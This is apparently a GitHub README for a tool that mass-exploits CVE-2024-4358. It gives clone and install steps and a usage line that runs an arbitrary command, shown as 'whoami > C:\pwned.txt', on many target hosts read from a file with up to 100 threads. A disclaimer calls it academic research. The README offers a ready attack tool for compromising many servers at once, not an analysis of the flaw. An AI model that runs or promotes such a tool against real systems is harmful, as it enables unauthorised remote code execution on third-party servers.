# CVE-2024-4358_Mass_Exploit
Modified tools from @sinsinology to do mass exploit. 

![CVE-2024-4358](https://github.com/Sk1dr0wz/CVE-2024-4358_Mass_Exploit/blob/main/carbon.png)

# Requirements

- Python 3.x

# Installation

```
git clone https://github.com/Sk1dr0wz/CVE-2024-4358_Mass_Exploit.git
cd CVE-2024-4358_Mass_Exploit
pip intstall -r requirements.txt
```

# How To Run

```
usage: python CVE-2024-4358.py --target-file targets.txt -c "whoami > C:\pwned.txt" --threads 10
options:
  -h, --help            show this help message and exit
  --target-file TARGET_FILE, -tf TARGET_FILE
                        File containing target IPs and ports (one per line, e.g: http://192.168.1.1:83)
  --command COMMAND, -c COMMAND
                        Command to execute
  --threads THREADS, -th THREADS
                        Number of threads to use (max: 100)
```

## Credit
* [SinSinology](https://twitter.com/SinSinology)

## Disclaimer
This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.